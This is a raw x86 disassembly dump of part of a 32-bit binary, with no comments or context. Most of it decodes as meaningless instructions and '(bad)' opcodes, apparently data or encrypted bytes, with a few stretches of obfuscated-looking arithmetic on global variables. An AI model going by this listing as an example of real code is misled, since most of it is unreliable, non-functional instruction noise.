  402b07:	adc    BYTE PTR cs:[edx-0x31],ah
  402b0b:	pusha  
  402b0c:	pushf  
  402b0d:	jo     0x402b62
  402b0f:	cmp    al,0x49
  402b11:	pop    ecx
  402b12:	sub    esp,ecx
  402b14:	in     eax,0x8b
  402b16:	(bad)  
  402b17:	out    0x16,eax
  402b19:	(bad)  
  402b1a:	mov    BYTE PTR [edx+0x30],bh
  402b1d:	pop    edx
  402b1e:	test   al,0x1f
  402b20:	push   esi
  402b21:	call   0x4f720496
  402b26:	(bad)  
  402b27:	mov    ah,0xeb
  402b29:	fwait
  402b2a:	bound  esp,QWORD PTR [ecx+0x3cf730b2]
  402b30:	jbe    0x402b0a
  402b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b33:	or     BYTE PTR [ecx],ah
  402b35:	loope  0x402b51
  402b37:	dec    edi
  402b38:	mov    cl,0xc8
  402b3a:	mov    edi,0x4a64962f
  402b3f:	iret   
  402b40:	sub    eax,edi
  402b42:	jb     0x402b54
  402b44:	(bad)  
  402b45:	std    
  402b46:	pop    edx
  402b47:	sbb    al,bl
  402b49:	sahf   
  402b4a:	hlt    
  402b4b:	pop    esi
  402b4c:	loope  0x402baf
  402b4e:	sahf   
  402b4f:	in     al,0xb6
  402b51:	sbb    al,0x16
  402b53:	mov    al,0xcf
  402b55:	add    dl,ch
  402b57:	mov    ebp,0x99f39031
  402b5c:	mov    DWORD PTR [ebx],edx
  402b5e:	dec    ebp
  402b5f:	int3   
  402b60:	popf   
  402b61:	int3   
  402b62:	mov    ds:0x8f3b5aab,eax
  402b67:	test   BYTE PTR [ecx-0x3d],0x51
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x4283a7,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x422074
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x428293,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283a7
  402b9a:	mov    DWORD PTR ds:0x42819f,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428243
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42831b,ebx
  402bb6:	cmp    DWORD PTR ds:0x428293,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428d94
  402bcc:	mov    edx,DWORD PTR ds:0x4282a3
  402bd2:	add    DWORD PTR ds:0x42827b,edx
  402bd8:	mov    DWORD PTR ds:0x42831f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42825b
  402be8:	mov    edx,DWORD PTR ds:0x42832b
  402bee:	sbb    DWORD PTR ds:0x4282b7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x428273
  402bfa:	xor    DWORD PTR ds:0x428337,edx
  402c00:	and    edx,DWORD PTR ds:0x42830f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42823b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x4281e3
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x42826b,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x422598
  402c34:	or     DWORD PTR ds:0x428163,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42830b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x42839f,0x42837b
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [esi+edx*8+0xd],0xffffffa1
  402c79:	jo     0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    bh,al
  402c83:	adc    DWORD PTR [eax],esi
  402c85:	xor    BYTE PTR [eax-0x5d715179],dh
  402c8b:	jg     0x402ce3
  402c8d:	xchg   ebp,eax
  402c8e:	fs pop ds
  402c90:	call   0x2316:0x64e825a1
  402c97:	or     al,0x13
  402c99:	cwde   
  402c9a:	push   edi
  402c9b:	or     BYTE PTR [esi+ecx*1+0x77c89d33],dh
  402ca2:	mov    eax,ds:0x8a230489
  402ca7:	hlt    
  402ca8:	in     al,0x6d
  402caa:	lahf   
  402cab:	int3   
  402cac:	cmp    ebp,DWORD PTR [eax]
  402cae:	ins    BYTE PTR es:[edi],dx
  402caf:	fstp   QWORD PTR [edx-0x53d4fc44]
  402cb5:	idiv   DWORD PTR [edi+eiz*4]
  402cb8:	xlat   BYTE PTR ds:[ebx]
  402cb9:	pop    edx
  402cba:	loop   0x402c86
  402cbc:	push   es
  402cbd:	mov    cl,0x70
  402cbf:	inc    edi
  402cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc1:	or     BYTE PTR [edi],cl
  402cc3:	popa   
  402cc4:	xor    al,bl
  402cc6:	sub    eax,0x9e9a37c6
  402ccb:	adc    al,0x30
  402ccd:	sbb    BYTE PTR cs:[ebp-0x21fe7e1e],ch
  402cd4:	jo     0x402c76
  402cd6:	hlt    
  402cd7:	les    ecx,FWORD PTR [edi+0x34e32826]
  402cdd:	or     al,0x42
  402cdf:	or     DWORD PTR fs:[esi+0x7b],0xd1101dc8
  402ce7:	push   ebx
  402ce8:	aas    
  402ce9:	cmp    dl,BYTE PTR [edx+edi*8+0x4b]
  402ced:	mov    edi,0x3311663b
  402cf2:	mov    esp,0x1656d4e
  402cf7:	jnp    0x402c7f
  402cf9:	mov    edi,DWORD PTR [edi-0x6975b298]
  402cff:	icebp  
  402d00:	adc    BYTE PTR [ecx-0x80],0x6f
  402d04:	pushf  
  402d05:	inc    edx
  402d06:	inc    edi
  402d07:	aas    
  402d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d09:	das    
  402d0a:	push   ds
  402d0b:	leave  
  402d0c:	mov    al,0xbd
  402d0e:	test   bl,bh
  402d10:	dec    ebx
  402d11:	jge    0x402d25
  402d13:	mov    eax,0xa1bec0c5
  402d18:	sti    
  402d19:	and    BYTE PTR [edx],0x22
  402d1c:	mov    eax,0x5a8acbba
  402d21:	bound  esi,QWORD PTR [edx-0x4666df06]
  402d27:	call   0xcc1eac84
  402d2c:	call   0x1172584
  402d31:	(bad)  
  402d32:	adc    esi,DWORD PTR [esi]
  402d34:	xchg   ecx,eax
  402d35:	mov    ah,0x2f
  402d37:	cmp    al,0xe5
  402d39:	mov    edx,esp
  402d3b:	lock shl DWORD PTR [edi-0x65ef4c71],cl
  402d42:	push   ss
  402d43:	ja     0x402da1
  402d45:	adc    cl,BYTE PTR [esi]
  402d47:	(bad)
  402d4a:	dec    esi
  402d4b:	or     BYTE PTR [ebx-0x241077f4],dh
  402d51:	adc    ah,BYTE PTR [ebx+eax*2]
  402d54:	clc    
  402d55:	pop    eax
  402d56:	and    eax,0x41e62085
  402d5b:	test   al,0xf5
  402d5d:	xchg   esp,eax
  402d5e:	adc    cl,BYTE PTR [edx+0x2d87a78d]
  402d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d65:	push   ebp
  402d66:	clc    
  402d67:	jp     0x402d4d
  402d69:	and    eax,0xbbd8043e
  402d6e:	fwait
  402d6f:	lock jbe 0x402d2d
  402d72:	cmp    BYTE PTR [eax-0x5f],dh
  402d75:	inc    ebp
  402d76:	mov    edx,0x64750920
  402d7b:	sub    eax,0xffffff95
  402d7e:	xchg   ebp,eax
  402d7f:	sbb    DWORD PTR [eax],0x5b770047
  402d85:	jae    0x402dce
  402d87:	loop   0x402e01
  402d89:	pop    eax
  402d8a:	fs jb  0x402dbf
  402d8d:	outs   dx,BYTE PTR ds:[esi]
  402d8e:	aam    0xb3
  402d90:	jl     0x402d42
  402d92:	and    ebp,DWORD PTR ds:0xf22d164f
  402d98:	int3   
  402d99:	mov    bl,0xd2
  402d9b:	mov    ecx,0xc7dc748a
  402da0:	les    esi,FWORD PTR [ebx-0x36]
  402da3:	out    dx,al
  402da4:	push   ebp
  402da5:	mov    bl,0xe6
  402da7:	push   ss
  402da8:	in     al,0xfb
  402daa:	(bad)
  402dad:	out    0x5d,al
  402daf:	and    bl,BYTE PTR [edi-0x580ec08b]
  402db5:	add    cl,BYTE PTR [ecx-0x3b]
  402db8:	fdiv   QWORD PTR [ebx-0x20]
  402dbb:	jmp    DWORD PTR [eax+edi*1+0x4268e94d]
  402dc2:	stos   BYTE PTR es:[edi],al
  402dc3:	adc    DWORD PTR [edi-0x2],esi
  402dc6:	lock popf 
  402dc8:	fwait
  402dc9:	mov    ch,0x8c
  402dcb:	push   cs
  402dcc:	xchg   ecx,eax
  402dcd:	pop    ebx
  402dce:	bnd jle 0x402e16
  402dd1:	test   BYTE PTR [ecx+0x21669878],0x42
  402dd8:	add    ecx,edi
  402dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ddb:	mov    esi,DWORD PTR [eax+0x6e639379]
  402de1:	fsubr  QWORD PTR [edi-0x7118a5d9]
  402de7:	sub    eax,0xe44032b1
  402dec:	mov    al,0xd3
  402dee:	inc    eax
  402def:	bound  ebx,QWORD PTR [edx+0x58]
  402df2:	sub    bh,ch
  402df4:	cld    
  402df5:	pop    ebp
  402df6:	inc    ecx
  402df7:	push   edx
  402df8:	mov    al,0xde
  402dfa:	test   al,0x3
  402dfc:	jo     0x402d7f
  402dfe:	pop    esp
  402dff:	fnsave [edx]
  402e01:	cmp    eax,0x60a8e06f
  402e06:	jmp    0x71f4:0x96c45959
  402e0d:	mov    bl,0xfe
  402e0f:	inc    edx
  402e10:	mov    ebp,0xbe2fa5aa
  402e15:	std    
  402e16:	dec    esi
  402e17:	imul   eax,DWORD PTR [ecx],0xc53c0502
  402e1d:	cs and al,0xf9
  402e20:	cli    
  402e21:	out    0xe1,eax
  402e23:	adc    al,0x62
  402e25:	sbb    BYTE PTR [esi],ah
  402e27:	push   edi
  402e28:	xor    eax,0x2e75b327
  402e2d:	mov    eax,ds:0x82632531
  402e32:	shl    BYTE PTR [ebx],cl
  402e34:	sub    al,0x21
  402e36:	nop
  402e37:	mov    ebx,0x774eac6
  402e3c:	enter  0xacd2,0x70
  402e40:	in     eax,0x4
  402e42:	in     al,dx
  402e43:	in     eax,dx
  402e44:	and    eax,0x4a1cd6dd
  402e49:	stos   BYTE PTR es:[edi],al
  402e4a:	dec    edi
  402e4b:	cmp    edx,DWORD PTR [ecx-0x36e8b6df]
  402e51:	or     eax,0xa830d204
  402e56:	push   eax
  402e57:	into   
  402e58:	and    ch,bh
  402e5a:	cli    
  402e5b:	(bad)  
  402e5c:	xchg   esi,eax
  402e5d:	sub    eax,0x4648767
  402e62:	scas   al,BYTE PTR es:[edi]
  402e63:	rep outs dx,BYTE PTR ds:[esi]
  402e65:	mov    ebx,0x13e59b23
  402e6a:	stos   DWORD PTR es:[edi],eax
  402e6b:	push   ss
  402e6c:	or     eax,0x37a46799
  402e71:	jmp    0x402e71
  402e73:	mov    ds:0x8bc1afec,eax
  402e78:	loopne 0x402ebf
  402e7a:	sub    esp,DWORD PTR [eax+0x61c6cc3d]
  402e80:	ss push esp
  402e82:	jmp    0x6f1d:0x8411db5d
  402e89:	xor    DWORD PTR [edi-0x1225d70e],0x6e805c37
  402e93:	push   ecx
  402e94:	push   ebp
  402e95:	cmp    ebp,ecx
  402e97:	(bad)
  402e9b:	retf   
  402e9c:	int3   
  402e9d:	mov    ebx,0x864846e3
  402ea2:	stc    
  402ea3:	pop    ecx
  402ea4:	mov    al,ds:0xa95726a4
  402ea9:	xor    BYTE PTR [eax-0xf],bl
  402eac:	jns    0x402e61
  402eae:	out    0x41,eax
  402eb0:	(bad)
  402eb4:	daa    
  402eb5:	cmp    al,bh
  402eb7:	xchg   esp,eax
  402eb8:	or     bh,BYTE PTR [ebp-0x1aae5eb3]
  402ebe:	cs retf 0xcea8
  402ec2:	and    DWORD PTR [esi-0x62],esp
  402ec5:	pop    esi
  402ec6:	aam    0x1f
  402ec8:	je     0x402ee5
  402eca:	repnz daa 
  402ecc:	scas   al,BYTE PTR es:[edi]
  402ecd:	sbb    DWORD PTR [edi-0x32],esi
  402ed0:	mov    eax,0x61114dac
  402ed5:	in     eax,dx
  402ed6:	pop    edi
  402ed7:	jno    0x402ede
  402ed9:	jnp    0x402f27
  402edb:	pusha  
  402edc:	pop    edx
  402edd:	mov    ebp,0x3873f37e
  402ee2:	ss dec ecx
  402ee4:	aaa    
  402ee5:	add    al,0x2
  402ee7:	xor    edi,DWORD PTR [ebp+0x7b]
  402eea:	push   0xffffffeb
  402eec:	iret   
  402eed:	xchg   ecx,eax
  402eee:	stc    
  402eef:	mov    ecx,0x69f66f46
  402ef4:	cmp    esi,DWORD PTR [ebp+0xdf760f7]
  402efa:	fcmovnbe st,st(2)
  402efc:	hlt    
  402efd:	xchg   ecx,eax
  402efe:	pusha  
  402eff:	std    
  402f00:	add    DWORD PTR [ebp-0x7363f3cb],esi
  402f06:	cmp    DWORD PTR [ebx-0x56],ecx
  402f09:	or     bh,bh
  402f0b:	fistp  DWORD PTR [ecx]
  402f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f0e:	jae    0x402eed
  402f10:	neg    DWORD PTR cs:[edi+ecx*2-0x5dfbc180]
  402f18:	out    0x68,eax
  402f1a:	push   ebp
  402f1b:	jmp    0x6c87fc8a
  402f20:	aad    0x2f
  402f22:	(bad)  [edi-0xc]
  402f25:	push   es
  402f26:	pop    ecx
  402f27:	and    cl,ah
  402f29:	cli    
  402f2a:	or     esp,ebx
  402f2c:	jnp    0x402f97
  402f2e:	add    BYTE PTR [ecx+0x494566fe],0x93
  402f35:	push   ds
  402f36:	shr    DWORD PTR ds:0x7ab56a46,1
  402f3c:	ds jl  0x402fb9
  402f3f:	cmp    eax,DWORD PTR [edx]
  402f41:	ins    DWORD PTR es:[edi],dx
  402f42:	add    edx,edx
  402f44:	icebp  
  402f45:	out    dx,al
  402f46:	adc    eax,0x25ce7864
  402f4b:	mov    esi,0x3a3297c1
  402f50:	aas    
  402f51:	out    0xcc,eax
  402f53:	push   esp
  402f54:	jo     0x402ee5
  402f56:	stos   DWORD PTR es:[edi],eax
  402f57:	sub    al,0x34
  402f5a:	fild   DWORD PTR [edi]
  402f5c:	aas    
  402f5d:	mov    cl,0x11
  402f5f:	push   edi
  402f60:	xor    eax,0x1ee0e8bc
  402f65:	xor    dl,BYTE PTR es:[edi+0x1a854153]
  402f6c:	lods   eax,DWORD PTR ds:[esi]
  402f6d:	call   0x749d:0xb4ded429
  402f74:	cwde   
  402f75:	das    
  402f76:	loop   0x402f27
  402f78:	mov    dh,BYTE PTR [eax]
  402f7a:	ret    0x99f9
  402f7d:	enter  0x1000,0x9e
  402f81:	(bad)  
  402f82:	ret    0x2353
  402f85:	jne    0x402f42
  402f87:	mov    DWORD PTR ds:0x661b26d3,0xe54b35a9
  402f91:	mov    ebp,0x2c22369f
  402f96:	out    dx,eax
  402f97:	pop    ss
  402f98:	dec    edx
  402f99:	loop   0x402f20
  402f9b:	cli    
  402f9c:	jge    0x402fe5
  402f9e:	cmp    al,BYTE PTR [esp+esi*8+0x68]
  402fa2:	cs pusha 
  402fa4:	outs   dx,DWORD PTR ds:[esi]
  402fa5:	lock adc ebp,DWORD PTR [eax+0x59]
  402fa9:	push   ss
  402faa:	test   BYTE PTR [edx+0x6829b963],0x5c
  402fb1:	xlat   BYTE PTR ds:[ebx]
  402fb2:	stos   BYTE PTR es:[edi],al
  402fb3:	cmovo  edx,DWORD PTR ds:0x354d661c
  402fbb:	jl     0x402fe1
  402fbd:	mov    edi,0x30ff266e
  402fc2:	ret    0x3a6f
  402fc5:	(bad)  
  402fc6:	mov    edi,0xf7d8cf05
  402fcb:	test   eax,0xdd85878a
  402fd0:	pop    es
  402fd1:	dec    edi
  402fd2:	sub    esi,DWORD PTR [ecx+0x1b01d065]
  402fd8:	jp     0x402fc1
  402fda:	fidiv  DWORD PTR fs:[ebp+0x5e22469b]
  402fe1:	lods   eax,DWORD PTR ds:[esi]
  402fe2:	push   ebx
  402fe3:	push   ebp
  402fe4:	dec    ebp
  402fe5:	pusha  
  402fe6:	pop    es
  402fe7:	cli    
  402fe8:	adc    ebx,DWORD PTR [edi+0x64f78d1]
  402fee:	pop    ss
  402fef:	mov    al,ds:0x9e8ac89a
  402ff4:	dec    edx
  402ff5:	xchg   DWORD PTR [edx+0x3da4d127],ebp
  402ffb:	stos   BYTE PTR es:[edi],al
  402ffc:	mov    cl,0x96
  402ffe:	in     al,0x6d
  403000:	adc    BYTE PTR [esi-0x31],0x2b
  403004:	shl    DWORD PTR [eax],1
  403006:	inc    ecx
  403007:	jns    0x402f97
  403009:	mov    ds:0x600be955,al
  40300e:	push   edi
  40300f:	push   esp
  403011:	jecxz  0x40303c
  403013:	js     0x402fc9
  403015:	sub    eax,ebp
  403017:	outs   dx,BYTE PTR ds:[esi]
  403018:	or     eax,0x38e16687
  40301d:	add    bh,BYTE PTR [ebx-0x9]
  403020:	mov    al,ds:0x373816d1
  403025:	sub    BYTE PTR [esi],al
  403027:	pop    ebx
  403028:	test   DWORD PTR [ecx-0x726da2db],esi
  40302e:	je     0x403019
  403030:	in     eax,dx
  403031:	sbb    al,BYTE PTR [edi]
  403033:	imul   ebp,DWORD PTR [ebx-0xa61d1ff],0xffffffdf
  40303a:	sbb    esi,DWORD PTR ds:0xbfd15cf4
  403040:	jbe    0x4030a7
  403042:	and    ah,BYTE PTR [ebx]
  403044:	retf   0xc281
  403047:	arpl   WORD PTR [eax+eax*1],si
  40304a:	add    BYTE PTR [ebx-0x35f433ab],cl
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282ab,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283af,0x0
  403071:	mov    DWORD PTR ds:0x4283b3,edx
  403077:	mov    DWORD PTR ds:0x4282fb,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283a3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x42816f,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283af,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428db4
  4030b1:	mov    DWORD PTR ds:0x42825b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x42827f
  4030c1:	or     edx,DWORD PTR ds:0x42831b
  4030c7:	add    edx,DWORD PTR ds:0x42819f
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283a7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42832f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x428393
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283b3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x42816b
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283b7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x4030b4
  403121:	or     ebx,0x18ec3d70
  403127:	sbb    BYTE PTR [esi-0x29e7e7ee],bl
  40312d:	mov    edx,0xc08730e2
  403132:	pop    ss
  403133:	cs mov edi,0x2f6f082a
  403139:	ror    ecx,0x1b
  40313c:	xchg   ecx,eax
  40313d:	xchg   edx,eax
  40313e:	imul   ebp,DWORD PTR [edx+eax*1-0xc],0xffffffed
  403143:	fstp   DWORD PTR [ebx+ebp*4]
  403146:	fidiv  WORD PTR [ecx]
  403148:	dec    BYTE PTR [edx]
  40314a:	xor    eax,0xeb7689a
  40314f:	and    ebp,DWORD PTR [ecx]
  403151:	fisub  WORD PTR [esi+0x75452e03]
  403157:	pop    esp
  403158:	sar    BYTE PTR [ebp-0x13],cl
  40315b:	sbb    bl,0xee
  40315e:	inc    eax
  40315f:	daa    
  403160:	jmp    0x4031bf
  403162:	xor    DWORD PTR [ebp+0xd],esi
  403165:	mov    dl,0xff
  403167:	adc    ebx,DWORD PTR [esi]
  403169:	hlt    
  40316a:	test   al,0xd9
  40316c:	aas    
  40316d:	sti    
  40316e:	xor    cl,BYTE PTR [ecx]
  403170:	aam    0xf8
  403172:	push   ecx
  403173:	mov    edi,0xc50b2484
  403178:	rol    BYTE PTR [esi-0x5f],0x17
  40317c:	xchg   edx,eax
  40317d:	and    eax,DWORD PTR [ebx]
  40317f:	sbb    esi,DWORD PTR [ecx-0x65]
  403182:	dec    ebp
  403183:	aas    
  403184:	xor    eax,0x59bc428d
  403189:	ror    DWORD PTR [ecx+0x14ab0808],0xab
  403190:	adc    DWORD PTR [edi+ebp*1],eax
  403193:	loope  0x40312c
  403195:	sbb    edx,DWORD PTR [ebp+0x2b]
  403198:	jge    0x4031fc
  40319a:	pop    ss
  40319b:	inc    ebx
  40319c:	lea    esp,[edi]
  40319e:	adc    al,0x90
  4031a0:	or     DWORD PTR [edx],0xaf92e8b6
  4031a6:	adc    al,0x97
  4031a8:	pop    edi
  4031a9:	dec    ebp
  4031aa:	gs mov cl,0xd5
  4031ad:	lahf   
  4031ae:	stos   DWORD PTR es:[edi],eax
  4031af:	dec    esi
  4031b0:	lods   eax,DWORD PTR ds:[esi]
  4031b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031b2:	push   cs
  4031b3:	(bad)  
  4031b4:	clc    
  4031b5:	jnp    0x4031bb
  4031b7:	fisttp QWORD PTR [edi-0x6b7abfc]
  4031bd:	adc    BYTE PTR [edi-0x79],0xc1
  4031c1:	xchg   DWORD PTR [ebp-0x32],edi
  4031c4:	mov    al,0xd4
  4031c6:	popa   
  4031c7:	loop   0x4031a9
  4031c9:	xchg   BYTE PTR [eax-0x5215124e],ah
  4031cf:	xchg   esp,eax
  4031d0:	xor    dh,BYTE PTR [eax-0x7c]
  4031d3:	inc    edi
  4031d4:	xchg   BYTE PTR [eax],ah
  4031d6:	jne    0x40323e
  4031d8:	mov    ds:0xc64df29a,eax
  4031dd:	ret    0x5f88
  4031e0:	cld    
  4031e1:	shr    DWORD PTR [esi-0x48bc6a39],1
  4031e7:	les    ecx,FWORD PTR [esi]
  4031e9:	push   esp
  4031ea:	push   esp
  4031eb:	cld    
  4031ec:	test   al,0x12
  4031ee:	ret    
  4031ef:	mov    dl,0x41
  4031f1:	push   es
  4031f2:	stos   BYTE PTR es:[edi],al
  4031f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f4:	xor    bh,BYTE PTR [eax-0x8853e30]
  4031fa:	xor    BYTE PTR [esi+0x69a85aac],bl
  403200:	int    0xbe
  403202:	push   ebp
  403203:	xchg   edx,eax
  403204:	push   0x479ed2ee
  403209:	sub    DWORD PTR [edx+0x7f],ecx
  40320c:	ja     0x403278
  40320e:	fstp   QWORD PTR [eax+0xaeb8c72]
  403214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403215:	pop    ebp
  403216:	(bad)  
  403217:	rep lods eax,DWORD PTR ds:[esi]
  403219:	popa   
  40321a:	(bad)  
  40321b:	and    edi,ebp
  40321d:	je     0x4031c5
  40321f:	pop    ss
  403220:	dec    ecx
  403221:	mov    edi,0x10f7ec4
  403226:	adc    al,0xd7
  403228:	mov    eax,ds:0xadf9db60
  40322d:	test   BYTE PTR [ecx-0x7746e210],bh
  403233:	pop    esi
  403234:	push   eax
  403235:	and    dh,BYTE PTR [eax]
  403237:	mov    bl,0x67
  403239:	fsubr  QWORD PTR [esi+0x1ee783f2]
  40323f:	dec    edx
  403240:	js     0x4032bb
  403242:	inc    ecx
  403243:	push   cs
  403244:	xchg   ecx,eax
  403245:	jns    0x4032bd
  403247:	push   esp
  403248:	imul   ebp,esp,0xb4b65c0e
  40324e:	es mov bl,0xc
  403251:	lods   eax,DWORD PTR ds:[esi]
  403252:	jmp    0xe46a:0xcba414f6
  403259:	xchg   esp,eax
  40325a:	loop   0x403220
  40325c:	xchg   esp,eax
  40325d:	adc    al,0x94
  40325f:	jecxz  0x4032a5
  403261:	mov    eax,0x42cd5ee1
  403266:	retf   0x3dd8
  403269:	adc    dl,BYTE PTR [ecx+0x27]
  40326c:	and    BYTE PTR [ebp-0xd],0x69
  403270:	add    esp,DWORD PTR [ebx-0x63]
  403273:	fisub  WORD PTR [edi-0x4a0d63d8]
  403279:	mov    dl,0xeb
  40327b:	ins    BYTE PTR es:[edi],dx
  40327c:	gs mov bh,0x5a
  40327f:	add    DWORD PTR [ebx+0x385798e4],ecx
  403285:	mov    dh,0xb3
  403287:	sub    BYTE PTR [ebx+eiz*4-0x124295c2],dh
  40328e:	and    al,0x1
  403290:	pop    edi
  403291:	addr16 and edi,edi
  403294:	adc    bh,BYTE PTR [ebx+0x2da3e6dc]
  40329a:	int    0xe9
  40329c:	fs out dx,eax
  40329e:	cmc    
  40329f:	sub    DWORD PTR [edx+0x18c2a2c2],0x4728b561
  4032a9:	add    BYTE PTR [edi],bh
  4032ab:	loope  0x4032b3
  4032ad:	mov    eax,ds:0x4f72e7a5
  4032b2:	ja     0x40332d
  4032b4:	cld    
  4032b5:	fdiv   DWORD PTR [ecx+0x2d]
  4032b8:	xor    DWORD PTR [esi+0x6],ecx
  4032bb:	adc    DWORD PTR [esi],esi
  4032bd:	dec    esp
  4032be:	mov    ebx,0x183d8ee3
  4032c3:	or     eax,DWORD PTR [ecx-0x5a]
  4032c6:	icebp  
  4032c7:	stos   DWORD PTR es:[edi],eax
  4032c8:	inc    ebp
  4032c9:	fst    QWORD PTR [ebp-0x72]
  4032cc:	xor    DWORD PTR [eax-0x9],ebx
  4032cf:	adc    eax,0xf9ad4b8c
  4032d4:	enter  0x1124,0x28
  4032d8:	outs   dx,DWORD PTR ss:[esi]
  4032da:	adc    eax,0x36fd868
  4032df:	xor    BYTE PTR [eax-0x433d9e8b],cl
  4032e5:	push   cs
  4032e6:	hlt    
  4032e7:	es pop ss
  4032e9:	sbb    ebx,DWORD PTR [edi-0x22]
  4032ec:	jecxz  0x40330e
  4032ee:	retf   
  4032ef:	das    
  4032f0:	mov    al,0x2c
  4032f2:	cmp    eax,0x6319f8a9
  4032f7:	adc    BYTE PTR [edi+eax*4-0x317ba3fe],bh
  4032fe:	aad    0x58
  403300:	xchg   ebx,eax
  403301:	xchg   ebx,eax
  403302:	je     0x40336c
  403304:	push   edi
  403305:	test   DWORD PTR [esp+eiz*2-0x33],esp
  403309:	xchg   esp,eax
  40330a:	mov    ah,BYTE PTR [edi-0x4a7975c5]
  403310:	jge    0x403320
  403312:	test   esp,esi
  403314:	inc    edi
  403315:	sbb    DWORD PTR [edx],eax
  403317:	xor    bh,BYTE PTR [eax]
  403319:	xchg   DWORD PTR [eax],eax
  40331b:	and    eax,0xfc9910a2
  403320:	sbb    eax,0x4fcdf7e9
  403325:	test   DWORD PTR [ecx],0xe3942fa5
  40332b:	pop    ecx
  40332c:	mov    ah,0xc
  40332e:	or     edx,DWORD PTR [ebx+0x4af5634]
  403334:	or     eax,0x12639bb7
  403339:	and    DWORD PTR [esi],edx
  40333b:	ss scas eax,DWORD PTR es:[edi]
  40333d:	and    al,0x16
  40333f:	xor    eax,ebp
  403341:	jle    0x403312
  403343:	(bad)  [ecx+0x7c]
  403346:	adc    BYTE PTR [ecx-0x1dca5501],bl
  40334c:	sub    BYTE PTR [ecx+0x2a826009],bh
  403352:	aaa    
  403353:	js     0x4033d0
  403355:	jae    0x4032e8
  403357:	pop    edi
  403358:	outs   dx,BYTE PTR ds:[esi]
  403359:	add    eax,0x6aabb854
  40335e:	aad    0xb0
  403360:	mov    edi,?
  403362:	mov    ds,eax
  403364:	cmp    BYTE PTR [ebx],dh
  403366:	mov    bh,0xd0
  403368:	mov    ebp,0x49abe531
  40336d:	sub    ebp,DWORD PTR [edx]
  40336f:	mov    dl,0x97
  403371:	pop    ds
  403372:	out    dx,eax
  403373:	jne    0x40332f
  403375:	add    BYTE PTR [ebx-0x61],cl
  403378:	and    DWORD PTR [esi-0x6b],ebx
  40337b:	dec    BYTE PTR [edx+ebx*8-0x6d]
  40337f:	cmp    ah,BYTE PTR [edx]
  403381:	dec    ecx
  403382:	sbb    BYTE PTR [edi-0x25c3dc51],ah
  403388:	js     0x4033a4
  40338a:	cmp    esp,ebx
  40338c:	push   ebx
  40338d:	jge    0x403342
  40338f:	inc    ecx
  403390:	in     eax,dx
  403391:	fidivr DWORD PTR [ecx-0x102be008]
  403397:	jne    0x4033b0
  403399:	inc    ecx
  40339a:	mov    ah,0xfa
  40339c:	push   ss
